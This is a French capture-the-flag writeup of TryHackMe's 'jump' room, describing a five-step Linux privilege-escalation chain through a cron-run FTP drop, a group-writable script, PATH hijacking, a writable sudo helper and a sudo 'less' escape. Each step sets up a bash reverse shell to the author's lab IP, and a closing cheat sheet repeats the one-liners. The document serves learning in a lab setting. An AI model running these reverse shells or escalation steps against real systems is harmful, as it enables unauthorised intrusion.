---
room: "jump"
plateforme: TryHackMe
url: https://tryhackme.com/room/jump
difficulte: Medium
statut: terminé
tags: [thm, writeup, linux, privesc, chain]
techniques: ["[[Service-Exploitation-Cron]]", "[[PATH-Hijacking]]", "[[Sudo-Exploitation]]"]
---

> [[Jr-Pentester-Path]] · [[HOME]]
>
> Techniques : [[Service-Exploitation-Cron]] · [[PATH-Hijacking]] · [[Sudo-Exploitation]]

# jump — Writeup

> **Résumé :** chaîne de privilege escalation à 5 paliers sur une seule machine Linux.
> `recon_user -> dev_user -> monitor_user -> ops_user -> root`
> Chaque palier abuse d'**une action faite par un user plus privilégié qui dépend d'un élément que le user courant contrôle** (dépôt FTP, fichier group-writable, commande sans chemin, script sudo, binaire sudo).

> **Mon IP attaquant (AttackBox) :** `10.128.96.107`

---

## Vue d'ensemble de la chaîne

| Palier | Vecteur | Élément contrôlé | Exécuté en tant que |
|--------|---------|------------------|---------------------|
| foothold -> **recon_user** | pipeline FTP + cron | fichier déposé dans `incoming/` | recon_user |
| recon_user -> **dev_user** | script group-writable | `/opt/dev/backup.sh` (groupe `dev_user`) | dev_user |
| dev_user -> **monitor_user** | PATH hijack | `/opt/dev/bin/ps` (groupe `dev_user`) | monitor_user |
| monitor_user -> **ops_user** | sudo + script writable | `/opt/app/deploy_helper.sh` (owner monitor_user) | ops_user |
| ops_user -> **root** | sudo GTFOBin | `less` | root |

Fil conducteur : l'appartenance au **groupe `devops`** (partagé par recon_user et dev_user) débloque les droits d'écriture de groupe.

---

## 1. Reconnaissance

Serveur **FTP** accessible, exploration de l'arborescence :
```
drwxrwxrwx   incoming     (world-writable)
drwxr-xr-x   pub
             pub/README.txt
```
`README.txt` :
```
[ recon pipeline ]
All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```
Un pipeline traite automatiquement les fichiers déposés dans `incoming/`.

---

## 2. Foothold -> recon_user

Technique : [[Service-Exploitation-Cron]]. Un cron exécute les fichiers de `incoming/` en tant que recon_user.

```bash
# Listener
nc -lvnp 4444
```
`job.sh` (reverse shell vers mon IP) :
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.128.96.107/4444 0>&1
```
Dépôt via FTP :
```
cd incoming
put /root/job.sh job.sh          # nom distant RELATIF
```
Shell **recon_user** reçu au passage du cron.

**Flag recon_user :** `THM{REDACTED}`

> Piège : `put /root/job.sh` seul -> `553 Could not create file` (le chemin absolu est pris comme destination). Il faut `put /root/job.sh job.sh`. Et `553` apparaît aussi si on n'est pas dans `incoming/` (seul dossier inscriptible).

---

## 3. recon_user -> dev_user

Énumération — je suis membre du groupe **devops** :
```bash
id
# uid=1001(recon_user) ... groups=1001(recon_user),1005(devops)
```
`/opt/dev/backup.sh` est **writable par le groupe** :
```
-rwxrwxr-x 1 dev_user dev_user ... /opt/dev/backup.sh   # groupe = rwx
```
Le script fait un `tar` du home en tant que dev_user. J'y ajoute mon reverse shell :
```bash
nc -lvnp 5556        # nouveau listener
echo 'bash -i >& /dev/tcp/10.128.96.107/5556 0>&1' >> /opt/dev/backup.sh
```
Au passage du cron qui lance `backup.sh`, shell **dev_user**.

**Flag dev_user :** `[à compléter]`

> `nano`/`vim` ne marchent pas dans un reverse shell non-interactif (`Standard input is not a terminal`). Utiliser `echo >>`.

---

## 4. dev_user -> monitor_user

Technique : [[PATH-Hijacking]]. Un process tourne en tant que monitor_user :
```bash
ps aux | grep monitor
# monitor+ ... /bin/bash /usr/local/bin/healthcheck
```
Le script `healthcheck` appelle `ps` **sans chemin absolu**, en boucle toutes les 5 s :
```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```
Je suis dans le groupe `dev_user`, je peux **écraser** `/opt/dev/bin/ps` (`-rw-rw-r--`, groupe rw), qui est dans le PATH du service avant `/usr/bin` :
```bash
nc -lvnp 5557        # listener
echo '#!/bin/bash' > /opt/dev/bin/ps
echo 'bash -i >& /dev/tcp/10.128.96.107/5557 0>&1' >> /opt/dev/bin/ps
chmod +x /opt/dev/bin/ps
```
Au tour suivant du healthcheck (< 5 s), shell **monitor_user**.

**Flag monitor_user :** `THM{REDACTED}`

> On **écrase** le `ps` existant (le dossier `/opt/dev/bin` n'est pas inscriptible, mais le fichier l'est via le groupe).

---

## 5. monitor_user -> ops_user

Technique : [[Sudo-Exploitation]]. `sudo -l` (dispo car healthcheck donne un PTY) :
```
(ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```
`deploy.sh` lance un script relatif :
```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```
`/opt/app/deploy_helper.sh` appartient à **monitor_user** (moi). Je le réécris :
```bash
nc -lvnp 5558        # listener
printf '#!/bin/bash\nbash -i >& /dev/tcp/10.128.96.107/5558 0>&1\n' > /opt/app/deploy_helper.sh
sudo -u ops_user /usr/local/bin/deploy.sh
```
Shell **ops_user**.

**Flag ops_user :** `THM{REDACTED}`

> `secure_path` dans sudo réinitialise le PATH : un PATH hijack ne passe pas via sudo ici. Mais le vecteur est un **fichier writable** (`deploy_helper.sh`), pas un PATH hijack.

---

## 6. ops_user -> root

`sudo -l` en ops_user :
```
(root) NOPASSWD: /usr/bin/less
```
`less` est un GTFOBin (https://gtfobins.github.io/gtfobins/less/#sudo). Stabiliser le shell puis évasion :
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
sudo /usr/bin/less /etc/profile
# dans less :
!bash
```
Shell **root** (`uid=0`). Lecture directe du flag possible aussi : `sudo /usr/bin/less /root/flag.txt`.

**Flag root :** `THM{REDACTED}`

> `!/bin/bash` dans less a perdu le `/` (-> `bin/bash: No such file`). `!bash` tout court fonctionne (bash est dans le PATH).

---

## 7. Ce que j'ai appris / mes pièges

- **Ne jamais copier une IP soufflée par un hint.** Deux hints de la room contenaient des IP étrangères (`10.82.84.138`, `10.82.70.250`) : un reverse shell serait parti chez un inconnu. Toujours **mon** IP.
- **Ctrl+C** sur un listener `nc` casse le reverse shell distant. J'ai perdu des sessions. Garder une fenêtre par palier et ne pas Ctrl+C sans raison.
- **L'appartenance à un groupe** (`id`) est la clé d'une chaîne : un fichier `-rw-rw-r--` d'un autre user devient writable si je suis dans son groupe.
- Avoir le **nom** de la technique (PATH hijack) ne suffit pas : il faut trouver **où** elle s'applique (quel dossier/fichier je peux écrire, quel PATH).
- `nano`/`vim` inutilisables en shell non-PTY : `echo >>` ou stabiliser avec `python3 -c 'import pty;...'`.
- FTP : `put <local> <nom_distant_relatif>`, et être dans le bon dossier inscriptible.

## 8. Commandes clés à retenir
```bash
# repérer ce qui tourne en tant qu'un autre user
ps aux | grep <user>
# fichiers writable par moi / par un groupe dont je suis membre
find / -writable -type f 2>/dev/null | grep -vE '/proc|/sys|/tmp'
find / -group <groupe> -type f 2>/dev/null
# écraser un binaire appelé sans chemin (PATH hijack)
echo '#!/bin/bash' > /chemin/cmd ; echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /chemin/cmd ; chmod +x /chemin/cmd
# GTFOBin sudo less -> root
sudo less /etc/profile   # puis !bash
```
